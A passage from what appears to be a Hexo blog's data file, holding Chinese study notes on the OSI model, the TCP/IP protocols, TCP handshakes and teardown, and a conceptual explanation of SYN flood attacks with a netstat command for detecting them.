至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。\n Syn攻击是一个典型的[DDOS](https://www.centos.bz/tag/ddos/)攻击。检测SYN攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击.在[Linux](http://www.centos.bz/)下可以如下命令检测是否被Syn攻击\n\n```shell\nnetstat -n -p TCP | grep SYN_RECV\n```\n\n 一般较新的TCP/IP协议栈都对这一过程进行修正来防范Syn攻击，修改TCP协议实现。主要方法有SynAttackProtect保护机制、SYN cookies技术、增加最大半连接和缩短超时时间等.\n 但是不能完全防范SYN攻击。\n\n\n\n- 所谓**四次挥手**(four-way handshake)，是指拆除一个TCP连接时，需要客户端和服务器总共发送4个数据包。\n\n与上面写的三次握手不同的是，客户端或服务器均可主动发起挥手动作。\n\n**第一次挥手：**主动方发送一个FIN，用来关闭主动方到被动方的数据传送\n\n**第二次挥手：**被动方收到这个FIN，它发回一个ACK，确认序号为收到的序号加1\n\n这中间如果被动方还有数据没有发送完毕，可以继续发送，直到完成后，再接着进行第三次挥手（**这也是为什么握手只要三次，挥手却需要四次**）\n\n**第三次挥手：**被动方关闭与主动方的连接，发送一个FIN给主动方\n\n**第四次挥手：**主动方发回ACK报文确认，并将确认序号设置为收到序号加1\n\n![100327022731](http://www.centos.bz/wp-content/uploads/2012/08/100327022731.jpg)\n\n 一般较新的TCP/IP协议栈都对这一过程进行修正来防范Syn攻击，修改tcp协议实现。主要方法有SynAttackProtect保护机制、SYN cookies技术、增加最大半连接和缩短超时时间等.\n 但是不能完全防范syn攻击。\n\n上图有疏漏，最后一个ACK包中的ACK应当等于Y+1。\n\n\n\n## IP地址（IPv4）\n\n每个计算机必须有一个 IP 地址才能够连入因特网。\n\n每个 IP 包必须有一个地址才能够发送到另一台计算机。\n\nTCP/IP 使用 4 组数字（4个数字）来为计算机编址。每个计算机必须有一个唯一的 4 组数字的地址（IPv4地址）。\n\n每组数字必须在 0 到 255（就是8位二进制数） 之间，并由点号隔开，比如：192.168.1.60。\n\n所以一个ip地址实际上一个32位的二进制数，每八位用一个点号分开。\n\n### IPv6\n\n下一代ip协议，为了应对IPv4地址日渐消耗殆尽的问题而设计的。暂且不表，因为我还没仔细了解\n\n\n\n## TCP/IP协议四层模型\n\nTCP/IP协议是OSI体系结构的一种实现，但将OSI概念体系中的”会话层，表达层，应用层“合并为”应用层“，传输层和网络层基本不变，又将”数据链路层和物理层“归并成”网络接口层“，使其更简洁，便于实现。\n\n### 链路层\n\n以太网协议规定，接入网络的设备都必须安装网络适配器，即网卡，数据包必须是从一块网卡传送到另一块网卡。而网卡地址就是数据包的发送地址和接收地址，有了MAC地址以后，[以太网](https://baike.baidu.com/item/以太网/99684)采用广播形式，把数据包发给该子网内所有主机，子网内每台主机在接收到这个包以后，都会读取首部里的目标MAC地址，然后和自己的MAC地址进行对比，如果相同就做下一步处理，如果不同，就丢弃这个包。 [4] \n\n所以链路层的主要工作就是对电信号进行分组并形成具有特定意义的数据帧，然后以广播的形式通过物理介质发送给接收方。 [4] \n\n\n\n### 网络层\n\n**IP协议**\n\n网络层引入了IP协议，制定了一套新地址，使得我们能够区分两台主机是否同属一个网络，这套地址就是网络地址，也就是所谓的IP地址。IP协议将这个32位的地址分为两部分，前面部分代表网络地址，后面部分表示该主机在局域网中的地址。如果两个IP地址在同一个子网内，则网络地址一定相同。为了判断IP地址中的网络地址，IP协议还引入了子网掩码，IP地址和子网掩码通过按位与运算后就可以得到网络地址。 [4] \n\n**ARP协议**\n\n即地址解析协议，是根据IP地址获取MAC地址的一个网络层协议。其工作原理如下：ARP首先会发起一个请求数据包，数据包的首部包含了目标主机的IP地址，然后这个数据包会在链路层进行再次包装，生成以太网数据包，最终由以太网广播给子网内的所有主机，每一台主机都会接收到这个数据包，并取出标头里的IP地址，然后和自己的IP地址进行比较，如果相同就返回自己的MAC地址，如果不同就丢弃该数据包。ARP接收返回消息，以此确定目标机的MAC地址；与此同时，ARP还会将返回的MAC地址与对应的IP地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。 [4] \n\n**路由协议**\n\n首先通过IP协议来判断两台主机是否在同一个[子网](https://baike.baidu.com/item/子网/1186929)中，如果在同一个子网，就通过ARP协议查询对应的MAC地址，然后以广播的形式向该子网内的主机发送数据包；如果不在同一个子网，以太网会将该数据包转发给本子网的网关进行路由。[网关](https://baike.baidu.com/item/网关/98992)是[互联网](https://baike.baidu.com/item/互联网/199186)上子网与子网之间的桥梁，所以网关会进行多次转发，最终将该数据包转发到目标IP所在的子网中，然后再通过ARP获取目标机MAC，最终也是通过广播形式将数据包发送给接收方。而完成这个路由协议的物理设备就是[路由器](https://baike.baidu.com/item/路由器/108294)，路由器扮演着交通枢纽的角色，它会根据信道情况，选择并设定路由，以最佳路径来转发数据包。 [4] \n\n所以，网络层的主要工作是定义网络地址、区分网段、子网内MAC寻址、对于不同子网的数据包进行路由。 [4] \n\n\n\n### 传输层\n\n链路层定义了主机的身份，即MAC地址，而网络层定义了IP地址，明确了主机所在的[网段](https://baike.baidu.com/item/网段/11026985)，有了这两个地址，数据包就从可以从一个主机发送到另一台主机。但实际上数据包是从一个主机的某个应用程序发出，然后由对方主机的应用程序接收。而每台电脑都有可能同时运行着很多个应用程序，所以当数据包被发送到主机上以后，是无法确定哪个应用程序要接收这个包。因此传输层引入了[UDP](https://baike.baidu.com/item/UDP/571511)协议来解决这个问题，为了给每个应用程序标识身份。\n\n传输层协议负责解决数据传输问题，包括数据通行的可靠性问题。传输层依赖更底层的网络层来完成实际的数据传输，在TCP/IP网络协议中，负责可靠通信的传输层协议为TCP协议。**而网络层一般用网络驱动来实现，普通的程序员不会涉及**；在TCP/IP协议中，网络层的协议为IP协议。\n\n**UDP协议**\n\nUDP协议定义了端口，同一个主机上的每个应用程序都需要指定唯一的端口号，并且规定网络中传输的数据包必须加上端口信息，当数据包到达主机以后，就可以根据端口号找到对应的应用程序了。UDP协议比较简单，实现容易，但它没有确认机制，数据包一旦发出，无法知道对方是否收到，因此可靠性较差，为了解决这个问题，提高网络可靠性，TCP协议就诞生了。\n\n**TCP协议**\n\nTCP即传输控制协议，是一种面向连接的、可靠的、基于字节流的通信协议。简单来说TCP就是有确认机制的UDP协议，每发出一个数据包都要求确认，如果有一个数据包丢失，就收不到确认，发送方就必须重发这个数据包。为了保证传输的可靠性，TCP协议在UDP基础之上建立了三次对话的确认机制，即在正式收发数据前，必须和对方建立可靠的连接。TCP数据包和UDP一样，都是由首部和数据两部分组成，唯一不同的是，TCP数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常TCP数据包的长度不会超过IP数据包的长度，以确保单个TCP数据包不必再分割。 [4] \n\n传输层的主要工作是定义[端口](https://baike.baidu.com/item/端口/103505)，标识应用程序身份，实现端口到端口的通信，TCP协议可以保证数据传输的可靠性。 [4] \n\n\n\n### 应用层\n\n理论上讲，有了以上三层协议的支持，数据已经可以从一个主机上的应用程序传输到另一台主机的应用程序了，但此时传过来的数据是字节流，不能很好的被程序识别，操作性差，因此，应用层定义了各种各样的协议来规范数据格式，常见的有[http](https://baike.baidu.com/item/http/243074),ftp,[smtp](https://baike.baidu.com/item/smtp/175887)等，在请求[Header](https://baike.baidu.com/item/Header/688992)中，分别定义了请求数据格式Accept和响应数据格式Content-Type，有了这个规范以后，当对方接收到请求以后就知道该用什么格式来解析，然后对请求进行处理，最后按照请求方要求的格式将数据返回，请求端接收到响应后，就按照规定的格式进行解读。 [4] \n\n所以应用层的主要工作就是定义数据格式并按照对应的格式解读数据。 [4] ","slug":"2020-11-21-现阶段学习过的计算机网络知识整合笔记","published":1,"updated":"2020-11-22T04:10:32.800Z","comments":1,"photos":[],"link":"","_id":"ckkntx9k0001exov7slf4rzxv","content":"<h1 id=\"现阶段计算机网络知识笔记以及整合\"><a href=\"#现阶段计算机网络知识笔记以及整合\" class=\"headerlink\" title=\"现阶段计算机网络知识笔记以及整合\"></a>现阶段计算机网络知识笔记以及整合</h1><h2 id=\"OSI网络参考模型\"><a href=\"#OSI网络参考模型\" class=\"headerlink\" title=\"OSI网络参考模型\"></a>OSI网络参考模型</h2><p><strong>开放式系统互联模型</strong>（英语：<strong>O</strong>pen <strong>S</strong>ystem <strong>I</strong>nterconnection Model，缩写：OSI；简称为<strong>OSI模型</strong>）是一种<a href=\"https://zh.wikipedia.org/wiki/概念模型\" target=\"_blank\" rel=\"noopener\">概念模型</a>，由<a href=\"https://zh.wikipedia.org/wiki/国际标准化组织\" target=\"_blank\" rel=\"noopener\">国际标准化组织</a>提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。定义于ISO/IEC 7498-1。</p>\n<p>根据建议X.200，OSI将计算机网络体系结构划分为以下七层，标有1～7，第1层在底部。 现“OSI/RM”是<a href=\"https://zh.wikipedia.org/wiki/英文\" target=\"_blank\" rel=\"noopener\">英文</a>“Open Systems Interconnection Reference Model”的缩写。</p>\n<p>PS:这只是一种参考模型</p>\n<h3 id=\"第7层-应用层\"><a href=\"#第7层-应用层\" class=\"headerlink\" title=\"第7层 应用层\"></a>第7层 应用层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/应用层\" target=\"_blank\" rel=\"noopener\">应用层</a></p>\n<p>应用层（Application Layer）提供为应用软件而设计的接口，以设置与另一应用软件之间的通信。例如：HTTP、HTTPS、FTP、Telnet、SSH、SMTP、POP3等。</p>\n<h3 id=\"第6层-表示层\"><a href=\"#第6层-表示层\" class=\"headerlink\" title=\"第6层 表示层\"></a>第6层 表示层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/表示层\" target=\"_blank\" rel=\"noopener\">表示层</a></p>\n<p>表示层（Presentation Layer）把数据转换为能与接收者的系统格式兼容并适合传输的格式。</p>\n<h3 id=\"第5层-会话层\"><a href=\"#第5层-会话层\" class=\"headerlink\" title=\"第5层 会话层\"></a>第5层 会话层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/会话层\" target=\"_blank\" rel=\"noopener\">会话层</a></p>\n<p>会话层（Session Layer）负责在数据传输中设置和维护计算机网络中两台计算机之间的通信连接。</p>\n<h3 id=\"第4层-传输层\"><a href=\"#第4层-传输层\" class=\"headerlink\" title=\"第4层 传输层\"></a>第4层 传输层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/传输层\" target=\"_blank\" rel=\"noopener\">传输层</a></p>\n<p>传输层（Transport Layer）把传输表头（TH）加至数据以形成数据包。传输表头包含了所使用的协议等发送信息。例如:传输控制协议（TCP）等。</p>\n<h3 id=\"第3层-网络层\"><a href=\"#第3层-网络层\" class=\"headerlink\" title=\"第3层 网络层\"></a>第3层 网络层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/网络层\" target=\"_blank\" rel=\"noopener\">网络层</a></p>\n<p>网络层（Network Layer）决定数据的路径选择和转寄，将网络表头（NH）加至数据包，以形成报文。网络表头包含了网络资料。例如:互联网协议（IP）等。</p>\n<h3 id=\"第2层-数据链路层\"><a href=\"#第2层-数据链路层\" class=\"headerlink\" title=\"第2层 数据链路层\"></a>第2层 数据链路层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/数据链路层\" target=\"_blank\" rel=\"noopener\">数据链路层</a></p>\n<p>数据链路层（Data Link Layer）负责网络寻址、错误侦测和改错。当表头和表尾被加至数据包时，会形成<a href=\"https://zh.wikipedia.org/wiki/資訊框\" target=\"_blank\" rel=\"noopener\">信息框</a>（Data Frame）。数据链表头（DLH）是包含了物理地址和错误侦测及改错的方法。数据链表尾（DLT）是一串指示数据包末端的字符串。例如以太网、无线局域网（Wi-Fi）和通用分组无线服务（GPRS）等。</p>\n<p>分为两个子层：逻辑链路控制（logical link control，LLC）子层和介质访问控制（Media access control，MAC）子层。</p>\n<h3 id=\"第1层-物理层\"><a href=\"#第1层-物理层\" class=\"headerlink\" title=\"第1层 物理层\"></a>第1层 物理层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/物理层\" target=\"_blank\" rel=\"noopener\">物理层</a></p>\n<p>物理层（Physical Layer）在局部局域网上传送<a href=\"https://zh.wikipedia.org/wiki/数据帧\" target=\"_blank\" rel=\"noopener\">数据帧</a>（Data Frame），它负责管理电脑通信设备和网络媒体之间的互通。包括了针脚、电压、线缆规范、集线器、中继器、网卡、主机接口卡等。</p>\n<h2 id=\"TCP-IP协议族\"><a href=\"#TCP-IP协议族\" class=\"headerlink\" title=\"TCP/IP协议族\"></a>TCP/IP协议族</h2><p>TCP/IP 是基于 TCP 和 IP 这两个最初的协议之上的不同的通信协议的大集合。</p>\n<p>里面有：</p>\n<h4 id=\"TCP-传输控制协议\"><a href=\"#TCP-传输控制协议\" class=\"headerlink\" title=\"TCP - 传输控制协议\"></a>TCP - 传输控制协议</h4><p>TCP 用于从应用程序到网络的数据传输控制。</p>\n<p>TCP 负责在数据传送之前将它们分割为 IP 包，然后在它们到达的时候将它们重组。</p>\n<hr>\n<h4 id=\"IP-网际协议（Internet-Protocol）\"><a href=\"#IP-网际协议（Internet-Protocol）\" class=\"headerlink\" title=\"IP - 网际协议（Internet Protocol）\"></a>IP - 网际协议（Internet Protocol）</h4><p>IP 负责计算机之间的通信。</p>\n<p>IP 负责在因特网上发送和接收数据包。</p>\n<hr>\n<h4 id=\"HTTP-超文本传输协议-Hyper-Text-Transfer-Protocol\"><a href=\"#HTTP-超文本传输协议-Hyper-Text-Transfer-Protocol\" class=\"headerlink\" title=\"HTTP - 超文本传输协议(Hyper Text Transfer Protocol)\"></a>HTTP - 超文本传输协议(Hyper Text Transfer Protocol)</h4><p>HTTP 负责 web 服务器与 web 浏览器之间的通信。</p>\n<p>HTTP 用于从 web 客户端（浏览器）向 web 服务器发送请求，并从 web 服务器向 web 客户端返回内容（网页）。</p>\n<hr>\n<h4 id=\"HTTPS-安全的-HTTP（HTTP-Secure）\"><a href=\"#HTTPS-安全的-HTTP（HTTP-Secure）\" class=\"headerlink\" title=\"HTTPS - 安全的 HTTP（HTTP Secure）\"></a>HTTPS - 安全的 HTTP（HTTP Secure）</h4><p>HTTPS 负责在 web 服务器和 web 浏览器之间的安全通信。</p>\n<p>作为有代表性的应用，HTTPS 会用于处理信用卡交易和其他的敏感数据。</p>\n<hr>\n<h4 id=\"SSL-安全套接字层（Secure-Sockets-Layer）\"><a href=\"#SSL-安全套接字层（Secure-Sockets-Layer）\" class=\"headerlink\" title=\"SSL - 安全套接字层（Secure Sockets Layer）\"></a>SSL - 安全套接字层（Secure Sockets Layer）</h4><p>SSL 协议用于为安全数据传输加密数据。（TLS协议的前身）</p>\n<hr>\n<h4 id=\"TLS-安全传输层协议（Transport-Layer-Security）\"><a href=\"#TLS-安全传输层协议（Transport-Layer-Security）\" class=\"headerlink\" title=\"TLS - 安全传输层协议（Transport Layer Security）\"></a>TLS - 安全传输层协议（Transport Layer Security）</h4><p>TLS协议用于在两个通信应用程序之间提供保密性和数据完整性。（标准化SSL协议）</p>\n<hr>\n<h4 id=\"SMTP-简易邮件传输协议（Simple-Mail-Transfer-Protocol）\"><a href=\"#SMTP-简易邮件传输协议（Simple-Mail-Transfer-Protocol）\" class=\"headerlink\" title=\"SMTP - 简易邮件传输协议（Simple Mail Transfer Protocol）\"></a>SMTP - 简易邮件传输协议（Simple Mail Transfer Protocol）</h4><p>SMTP 用于电子邮件的传输。</p>\n<hr>\n<h4 id=\"MIME-多用途因特网邮件扩展（Multi-purpose-Internet-Mail-Extensions）\"><a href=\"#MIME-多用途因特网邮件扩展（Multi-purpose-Internet-Mail-Extensions）\" class=\"headerlink\" title=\"MIME - 多用途因特网邮件扩展（Multi-purpose Internet Mail Extensions）\"></a>MIME - 多用途因特网邮件扩展（Multi-purpose Internet Mail Extensions）</h4><p>MIME 协议使 SMTP 有能力通过 TCP/IP 网络传输多媒体文件，包括声音、视频和二进制数据。</p>\n<hr>\n<h4 id=\"IMAP-因特网消息访问协议（Internet-Message-Access-Protocol）\"><a href=\"#IMAP-因特网消息访问协议（Internet-Message-Access-Protocol）\" class=\"headerlink\" title=\"IMAP - 因特网消息访问协议（Internet Message Access Protocol）\"></a>IMAP - 因特网消息访问协议（Internet Message Access Protocol）</h4><p>IMAP 用于存储和取回电子邮件。</p>\n<hr>\n<h4 id=\"POP-邮局协议（Post-Office-Protocol）\"><a href=\"#POP-邮局协议（Post-Office-Protocol）\" class=\"headerlink\" title=\"POP - 邮局协议（Post Office Protocol）\"></a>POP - 邮局协议（Post Office Protocol）</h4><p>POP 用于从电子邮件服务器向个人电脑下载电子邮件。</p>\n<hr>\n<h4 id=\"FTP-文件传输协议（File-Transfer-Protocol）\"><a href=\"#FTP-文件传输协议（File-Transfer-Protocol）\" class=\"headerlink\" title=\"FTP - 文件传输协议（File Transfer Protocol）\"></a>FTP - 文件传输协议（File Transfer Protocol）</h4><p>FTP 负责计算机之间的文件传输。</p>\n<hr>\n<h4 id=\"NTP-网络时间协议（Network-Time-Protocol）\"><a href=\"#NTP-网络时间协议（Network-Time-Protocol）\" class=\"headerlink\" title=\"NTP - 网络时间协议（Network Time Protocol）\"></a>NTP - 网络时间协议（Network Time Protocol）</h4><p>NTP 用于在计算机之间同步时间（钟）。</p>\n<hr>\n<h4 id=\"DHCP-动态主机配置协议（Dynamic-Host-Configuration-Protocol）\"><a href=\"#DHCP-动态主机配置协议（Dynamic-Host-Configuration-Protocol）\" class=\"headerlink\" title=\"DHCP - 动态主机配置协议（Dynamic Host Configuration Protocol）\"></a>DHCP - 动态主机配置协议（Dynamic Host Configuration Protocol）</h4><p>DHCP 用于向网络中的计算机分配动态 IP 地址。</p>\n<hr>\n<h4 id=\"SNMP-简单网络管理协议（Simple-Network-Management-Protocol）\"><a href=\"#SNMP-简单网络管理协议（Simple-Network-Management-Protocol）\" class=\"headerlink\" title=\"SNMP - 简单网络管理协议（Simple Network Management Protocol）\"></a>SNMP - 简单网络管理协议（Simple Network Management Protocol）</h4><p>SNMP 用于计算机网络的管理。</p>\n<hr>\n<h4 id=\"LDAP-轻量级的目录访问协议（Lightweight-Directory-Access-Protocol）\"><a href=\"#LDAP-轻量级的目录访问协议（Lightweight-Directory-Access-Protocol）\" class=\"headerlink\" title=\"LDAP - 轻量级的目录访问协议（Lightweight Directory Access Protocol）\"></a>LDAP - 轻量级的目录访问协议（Lightweight Directory Access Protocol）</h4><p>LDAP 用于从因特网搜集关于用户和电子邮件地址的信息。</p>\n<hr>\n<h4 id=\"ICMP-因特网消息控制协议（Internet-Control-Message-Protocol）\"><a href=\"#ICMP-因特网消息控制协议（Internet-Control-Message-Protocol）\" class=\"headerlink\" title=\"ICMP - 因特网消息控制协议（Internet Control Message Protocol）\"></a>ICMP - 因特网消息控制协议（Internet Control Message Protocol）</h4><p>ICMP 负责网络中的错误处理。</p>\n<hr>\n<h4 id=\"ARP-地址解析协议（Address-Resolution-Protocol）\"><a href=\"#ARP-地址解析协议（Address-Resolution-Protocol）\" class=\"headerlink\" title=\"ARP - 地址解析协议（Address Resolution Protocol）\"></a>ARP - 地址解析协议（Address Resolution Protocol）</h4><p>ARP - 用于通过 IP 来查找基于 IP 地址的计算机网卡的硬件地址。</p>\n<hr>\n<h4 id=\"RARP-反向地址转换协议（Reverse-Address-Resolution-Protocol）\"><a href=\"#RARP-反向地址转换协议（Reverse-Address-Resolution-Protocol）\" class=\"headerlink\" title=\"RARP - 反向地址转换协议（Reverse Address Resolution Protocol）\"></a>RARP - 反向地址转换协议（Reverse Address Resolution Protocol）</h4><p>RARP 用于通过 IP 查找基于硬件地址的计算机网卡的 IP 地址。</p>\n<hr>\n<h4 id=\"BOOTP-自举协议（Boot-Protocol）\"><a href=\"#BOOTP-自举协议（Boot-Protocol）\" class=\"headerlink\" title=\"BOOTP - 自举协议（Boot Protocol）\"></a>BOOTP - 自举协议（Boot Protocol）</h4><p>BOOTP 用于从网络启动计算机。</p>\n<hr>\n<h4 id=\"PPTP-点对点隧道协议（Point-to-Point-Tunneling-Protocol）\"><a href=\"#PPTP-点对点隧道协议（Point-to-Point-Tunneling-Protocol）\" class=\"headerlink\" title=\"PPTP - 点对点隧道协议（Point to Point Tunneling Protocol）\"></a>PPTP - 点对点隧道协议（Point to Point Tunneling Protocol）</h4><p>PPTP 用于私人网络之间的连接（隧道）。</p>\n<h2 id=\"TCP-IP\"><a href=\"#TCP-IP\" class=\"headerlink\" title=\"TCP/IP\"></a>TCP/IP</h2><p>TCP/IP 是用于因特网 (Internet) 的通信协议。</p>\n<p>TCP/IP 是供已连接因特网的计算机进行通信的通信协议。</p>\n<p>TCP/IP 指传输控制协议/网际协议（<em>T</em>ransmission <em>C</em>ontrol <em>P</em>rotocol / <em>I</em>nternet <em>P</em>rotocol）。</p>\n<p>TCP/IP 定义了电子设备（比如计算机）如何连入因特网，以及数据如何在它们之间传输的标准。</p>\n<h3 id=\"TCP-使用固定的连接\"><a href=\"#TCP-使用固定的连接\" class=\"headerlink\" title=\"TCP 使用固定的连接\"></a>TCP 使用固定的连接</h3><p>TCP 用于应用程序之间的通信。</p>\n<p>当应用程序希望通过 TCP 与另一个应用程序通信时，它会发送一个通信请求。这个请求必须被送到一个确切的地址。在双方”握手”之后，TCP 将在两个应用程序之间建立一个全双工 (full-duplex) 的通信。</p>\n<p>这个全双工的通信将占用两个计算机之间的通信线路，直到它被一方或双方关闭为止。</p>\n<p>UDP 和 TCP 很相似，但是更简单，同时可靠性低于 TCP。</p>\n<h3 id=\"IP-是无连接的\"><a href=\"#IP-是无连接的\" class=\"headerlink\" title=\"IP 是无连接的\"></a>IP 是无连接的</h3><p>IP 用于计算机之间的通信。</p>\n<p>IP 是无连接的通信协议。它不会占用两个正在通信的计算机之间的通信线路。这样，IP 就降低了对网络线路的需求。每条线可以同时满足许多不同的计算机之间的通信需要。</p>\n<p>通过 IP，消息（或者其他数据）被分割为小的独立的包，并通过因特网在计算机之间传送。</p>\n<p>IP 负责将每个包路由至它的目的地。</p>\n<h3 id=\"TCP-IP协同而分工工作\"><a href=\"#TCP-IP协同而分工工作\" class=\"headerlink\" title=\"TCP/IP协同而分工工作\"></a><strong>TCP/IP协同而分工工作</strong></h3><p>TCP/IP 意味着 TCP 和 IP 在一起协同工作。但他们分工又十分分明，简单来说：</p>\n<p>TCP 负责应用软件（比如浏览器）和网络软件之间的通信。</p>\n<p>IP 负责计算机之间的通信。</p>\n<p>TCP 负责将数据分割并装入 IP 包，然后在它们到达的时候重新组合它们。</p>\n<p>IP 负责将包发送至接受者。</p>\n<h4 id=\"TCP三次握手、四次挥手\"><a href=\"#TCP三次握手、四次挥手\" class=\"headerlink\" title=\"TCP三次握手、四次挥手\"></a>TCP三次握手、四次挥手</h4><hr>\n<ul>\n<li>所谓<strong>三次握手</strong>(Three-way Handshake)，是指建立一个TCP连接时，需要客户端和服务器总共发送3个数据包。</li>\n</ul>\n<p>三次握手的目的是连接服务器指定端口，建立TCP连接,并同步连接双方的序列号和确认号并交换 TCP 窗口大小信息。<br><strong>第一次握手：</strong>Client向Server发送SYN握手包（seq=x），进入SYN_SEND状态<br><strong>第二次握手：</strong>Server返回SYN+ACK确认包(seq=y,ack=x+1)，进入SYN_RECV状态<br><strong>第三次握手：</strong>Client再次发送ACK确认包(ack=y+1),此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。</p>\n<p>完成三次握手，客户端与服务器开始传送数据。</p>\n<h4 id=\"图文详解：\"><a href=\"#图文详解：\" class=\"headerlink\" title=\"图文详解：\"></a>图文详解：</h4><p><img src=\"http://www.centos.bz/wp-content/uploads/2012/08/100327002629.png\" alt=\"100327002629\"><br> 第一次握手:<br> 客户端发送一个TCP的<strong>SYN标志位置为1</strong>的包（表明这是一个<strong>SYN包</strong>）指明客户打算连接的服务器的端口，以及<strong>初始序号X</strong>,保存在包头的序列号(<strong>Seq</strong>uence Number)字段里。<br><img src=\"http://www.centos.bz/wp-content/uploads/2012/08/100327002911.png\" alt=\"100327002911\"><br> 第二次握手:<br> 服务器发回<strong>SYN+ACK确认包</strong>应答。即<strong>SYN标志位和ACK标志位均为1</strong>同时，将确认序号(<strong>Ack</strong>nowledgement Number)设置为客户的初始序号加1，即X+1。并设置这个SYN+ACK确认包的序列号（seq）为<strong>Y</strong><br><img src=\"http://www.centos.bz/wp-content/uploads/2012/08/100327003054.png\" alt=\"100327003054\"></p>\n<p>第三次握手.<br> 客户端发送一个<strong>ACK确认包</strong>（ <strong>SYN标志位为0,ACK标志位为1</strong>）。并且把服务器发来SYN+ACK确认包的序列号（seq）字段+1,放在确认序号字段中发送给对方。<br><img src=\"http://www.centos.bz/wp-content/uploads/2012/08/100327003214.png\" alt=\"100327003214\"></p>\n<p>上面这个来回对对方发来的数据包的序列号seq的值+1再作为确认序号发送回去的过程，可以在一定程度上保证信息传递的完整性以及安全。</p>\n<p><strong>SYN攻击</strong><br>   在三次握手过程中，服务器发送SYN-ACK之后，收到客户端的ACK之前的TCP连接称为半连接(half-open connect).此时服务器处于Syn_RECV状态.当收到ACK后，服务器转入ESTABLISHED状态.<br>  Syn攻击就是 攻击客户端  在短时间内伪造大量不存在的IP地址，向服务器不断地发送syn包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直 至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。<br> Syn攻击是一个典型的<a href=\"https://www.centos.bz/tag/ddos/\" target=\"_blank\" rel=\"noopener\">DDOS</a>攻击。检测SYN攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击.在<a href=\"http://www.centos.bz/\" target=\"_blank\" rel=\"noopener\">Linux</a>下可以如下命令检测是否被Syn攻击</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">netstat -n -p TCP | grep SYN_RECV<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p> 一般较新的TCP/IP协议栈都对这一过程进行修正来防范Syn攻击，修改TCP协议实现。主要方法有SynAttackProtect保护机制、SYN cookies技术、增加最大半连接和缩短超时时间等.<br> 但是不能完全防范SYN攻击。</p>\n<ul>\n<li>所谓<strong>四次挥手</strong>(four-way handshake)，是指拆除一个TCP连接时，需要客户端和服务器总共发送4个数据包。</li>\n</ul>\n<p>与上面写的三次握手不同的是，客户端或服务器均可主动发起挥手动作。</p>\n<p><strong>第一次挥手：</strong>主动方发送一个FIN，用来关闭主动方到被动方的数据传送</p>\n<p><strong>第二次挥手：</strong>被动方收到这个FIN，它发回一个ACK，确认序号为收到的序号加1</p>\n<p>这中间如果被动方还有数据没有发送完毕，可以继续发送，直到完成后，再接着进行第三次挥手（<strong>这也是为什么握手只要三次，挥手却需要四次</strong>）</p>\n<p><strong>第三次挥手：</strong>被动方关闭与主动方的连接，发送一个FIN给主动方</p>\n<p><strong>第四次挥手：</strong>主动方发回ACK报文确认，并将确认序号设置为收到序号加1</p>\n<p><img src=\"http://www.centos.bz/wp-content/uploads/2012/08/100327022731.jpg\" alt=\"100327022731\"></p>\n<p> 一般较新的TCP/IP协议栈都对这一过程进行修正来防范Syn攻击，修改tcp协议实现。主要方法有SynAttackProtect保护机制、SYN cookies技术、增加最大半连接和缩短超时时间等.<br> 但是不能完全防范syn攻击。</p>\n<p>上图有疏漏，最后一个ACK包中的ACK应当等于Y+1。</p>\n<h2 id=\"IP地址（IPv4）\"><a href=\"#IP地址（IPv4）\" class=\"headerlink\" title=\"IP地址（IPv4）\"></a>IP地址（IPv4）</h2><p>每个计算机必须有一个 IP 地址才能够连入因特网。</p>\n<p>每个 IP 包必须有一个地址才能够发送到另一台计算机。</p>\n<p>TCP/IP 使用 4 组数字（4个数字）来为计算机编址。每个计算机必须有一个唯一的 4 组数字的地址（IPv4地址）。</p>\n<p>每组数字必须在 0 到 255（就是8位二进制数） 之间，并由点号隔开，比如：192.168.1.60。</p>\n<p>所以一个ip地址实际上一个32位的二进制数，每八位用一个点号分开。</p>\n<h3 id=\"IPv6\"><a href=\"#IPv6\" class=\"headerlink\" title=\"IPv6\"></a>IPv6</h3><p>下一代ip协议，为了应对IPv4地址日渐消耗殆尽的问题而设计的。暂且不表，因为我还没仔细了解</p>\n<h2 id=\"TCP-IP协议四层模型\"><a href=\"#TCP-IP协议四层模型\" class=\"headerlink\" title=\"TCP/IP协议四层模型\"></a>TCP/IP协议四层模型</h2><p>TCP/IP协议是OSI体系结构的一种实现，但将OSI概念体系中的”会话层，表达层，应用层“合并为”应用层“，传输层和网络层基本不变，又将”数据链路层和物理层“归并成”网络接口层“，使其更简洁，便于实现。</p>\n<h3 id=\"链路层\"><a href=\"#链路层\" class=\"headerlink\" title=\"链路层\"></a>链路层</h3><p>以太网协议规定，接入网络的设备都必须安装网络适配器，即网卡，数据包必须是从一块网卡传送到另一块网卡。而网卡地址就是数据包的发送地址和接收地址，有了MAC地址以后，<a href=\"https://baike.baidu.com/item/以太网/99684\" target=\"_blank\" rel=\"noopener\">以太网</a>采用广播形式，把数据包发给该子网内所有主机，子网内每台主机在接收到这个包以后，都会读取首部里的目标MAC地址，然后和自己的MAC地址进行对比，如果相同就做下一步处理，如果不同，就丢弃这个包。 [4] </p>\n<p>所以链路层的主要工作就是对电信号进行分组并形成具有特定意义的数据帧，然后以广播的形式通过物理介质发送给接收方。 [4] </p>\n<h3 id=\"网络层\"><a href=\"#网络层\" class=\"headerlink\" 